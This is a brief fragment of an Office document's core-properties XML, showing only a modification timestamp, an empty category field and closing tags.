  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-28T07:14:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>